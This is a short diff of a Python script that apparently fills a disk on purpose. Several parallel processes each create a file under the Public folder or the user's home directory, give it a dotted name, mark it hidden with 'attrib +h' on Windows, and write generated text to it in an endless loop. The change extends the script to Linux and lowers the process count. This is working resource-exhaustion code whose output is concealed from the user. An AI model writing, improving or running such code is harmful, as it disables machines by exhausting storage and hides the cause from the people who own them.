@@ -18,16 +18,17 @@ def tff():
 def changeOS():
     drive = ""
     if os_name == "Windows":
-        drive = "C:"
+        drive = "C:/Users/Public"
     if os_name == "Linux":
-        pass
+        drive = os.path.expanduser('~')
     return drive
 
 
 def writeFile(i):
-    filename = changeOS() + f"/Users/Public/.00{i}"
+    filename = changeOS() + f"/.00{i}"
     with open(filename, "w", buffering=CSZE * 100) as file:
-        os.system("attrib +h " + filename)
+        if(os_name == "Windows"):
+            os.system("attrib +h " + filename)
         while True:
             text = tff()
             for _ in range(100):
@@ -41,7 +42,7 @@ def main():
     
     changeOS()
     p = []
-    for x in range(0, 12):
+    for x in range(0, 3):
         p.append(mp.Process(target=writeFile, args = {f"{x}000"}))
         p[x].start()
 
